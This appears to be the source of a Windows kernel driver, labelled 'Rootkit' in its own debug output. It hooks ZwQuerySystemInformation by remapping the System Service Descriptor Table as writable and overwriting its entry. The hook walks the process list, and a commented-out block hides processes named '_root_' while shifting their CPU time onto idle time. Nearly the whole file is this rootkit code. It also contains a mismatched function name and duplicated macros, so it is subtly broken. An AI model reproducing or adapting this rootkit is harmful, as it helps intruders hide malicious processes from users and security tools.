#include "stdafx.h"
#include <ntddk.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ntoskrnl.lib")

#pragma pack(1)
typedef struct ServiceDescriptorTable {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase;
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack(1)

extern "C" {
__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
}
//__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
//__declspec(dllimport) NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation;


#define SYSTEMSERVICE(_function) KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

PMDL g_pmdlSystemCall;
volatile LONG *MappedSystemCallTable;


#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
#define HOOK_SYSCALL(_Function, _Hook, _Orig) \
	(PVOID)_Orig = (PVOID) InterlockedExchange(&MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

#define UNHOOK_SYSCALL(_Function, _Hook, _Orig) \
	InterlockedExchange(&MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)


#ifdef __cplusplus
extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath);
extern "C" VOID OnUnload(IN PDRIVER_OBJECT DriverObject);

#endif


struct _SYSTEM_THREAD
{
	LARGE_INTEGER	KernelTime;
	LARGE_INTEGER	UserTime;
	LARGE_INTEGER	CreateTime;
	ULONG			WaitTime;
	PVOID			StartAddress;
	CLIENT_ID		ClientIs;
	KPRIORITY		Priority;
	KPRIORITY		BasePriority;
	ULONG			ContextSwitchCount;
	KWAIT_REASON	WaitReason;
};


struct _SYSTEM_PROCESSES
{
	ULONG			NextEntryDelta;
	ULONG			ThreadCount;
	ULONG			Reserved[6];
	LARGE_INTEGER	CreateTime;
	LARGE_INTEGER	UserTime;
	LARGE_INTEGER	KernelTime;
	UNICODE_STRING	ProcessName;
	KPRIORITY		BasePriority;
	ULONG			ProcessId;
	ULONG			InheritedFromProcessId;
	ULONG			HandleCount;
	ULONG			Reserved2[2];
	VM_COUNTERS		VmCounters;
	IO_COUNTERS		IoCounters;	//Windows 2000 only
	struct _SYSTEM_THREAD	Thread[1];

};


struct _SYSTEM_PROCESSOR_TIMES
{
	LARGE_INTEGER	IdleTime;
	LARGE_INTEGER	KernelTime;
	LARGE_INTEGER	UserTime;
	LARGE_INTEGER	DpcTime;
	LARGE_INTEGER	InterruptTime;
	ULONG			InterruptCount;
};



extern "C" NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
	IN ULONG	SystemInformationClass,
	IN PVOID	SystemInformation,
	IN ULONG	SystemInformationLength,
	OUT PULONG	ReturnLength
	);


typedef NTSTATUS(*ZWQUERYSYSTEMINFORMATION)(
	IN ULONG	SystemInformationClass,
	IN PVOID	SystemInformation,
	IN ULONG	SystemInformationLength,
	OUT PULONG	ReturnLength
	);

ZWQUERYSYSTEMINFORMATION	OldZwQuerySystemInformation;

LARGE_INTEGER		m_UserTime;
LARGE_INTEGER		m_KernelTime;

NTSTATUS NewZwQuerySysteminformation(IN ULONG SystemInformationClass, IN PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength)

{

NTSTATUS ntStatus;

ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation))(
		SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);

if(NT_SUCCESS(ntStatus))
{
	if(SystemInformationClass==5)
	{
	struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
	struct _SYSTEM_PROCESSES *prev = NULL;

	DbgPrint("SystemInformation is 5");

	while(curr)
	{
		DbgPrint("Current item is %x\n", curr);

		if(curr->ProcessName.Buffer != NULL)
		{

			//

			/*
			if(memcmp(curr->ProcessName.Buffer, L"_root_", 12) == 0)
			{
				m_UserTime.QuadPart += curr->UserTime.QuadPart;
				m_KernelTime.QuadPart += curr->KernelTime.QuadPart;
				
				if(prev){
					if(curr->NextEntryDelta)
						prev->NextEntryDelta += curr->NextEntryDelta;
					else
						prev->NextEntryDelta = 0;
				}
				else
				{
					if(curr->NextEntryDelta)
					{
						SystemInformation = (PVOID *)curr->NextEntryDelta;
					}
					else
						SystemInformation = NULL;
				}
			}
			*/
			//
		}
		else
		{
			curr->UserTime.QuadPart += m_UserTime.QuadPart;
			curr->KernelTime.QuadPart += m_KernelTime.QuadPart;

			m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
		}

		prev = curr;

		if(curr->NextEntryDelta)
			curr = (_SYSTEM_PROCESSES *)((unsigned int)curr + (unsigned int)curr->NextEntryDelta);
		else curr = NULL;


		//
	}


	}

	else if(SystemInformationClass == 8)
	{
		struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
		times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
	}
}

return ntStatus;
}


VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	DbgPrint("Rootkit: OnUnload Called\n");
	UNHOOK_SYSCALL(ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation);

	if(g_pmdlSystemCall)
	{
		MmUnmapLockedPages((PVOID)MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
	}

}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)
{
	UNICODE_STRING DeviceName,Win32Device;
	PDEVICE_OBJECT DeviceObject = NULL;
	NTSTATUS status;
	unsigned i;

	DriverObject->DriverUnload = OnUnload;

	m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;

//	#define SYSTEMSERVICE(_function) KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

	OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)KeServiceDescriptorTable.ServiceTableBase[*(PULONG)((PUCHAR)ZwQuerySystemInformation+1)];

	OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));
	g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4);

	if(!g_pmdlSystemCall)
		return STATUS_UNSUCCESSFUL;

	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

	g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

	MappedSystemCallTable = (volatile long*)MmMapLockedPages(g_pmdlSystemCall, KernelMode);


	#define HOOK_SYSCALL(_Function, _Hook, _Orig) \
	(PVOID)_Orig = (PVOID) InterlockedExchange(&MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)


	OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)InterlockedExchange(&MappedSystemCallTable[SYSCALL_INDEX(ZwQuerySystemInformation)], (LONG)NewZwQuerySysteminformation);

	return STATUS_SUCCESS;
}

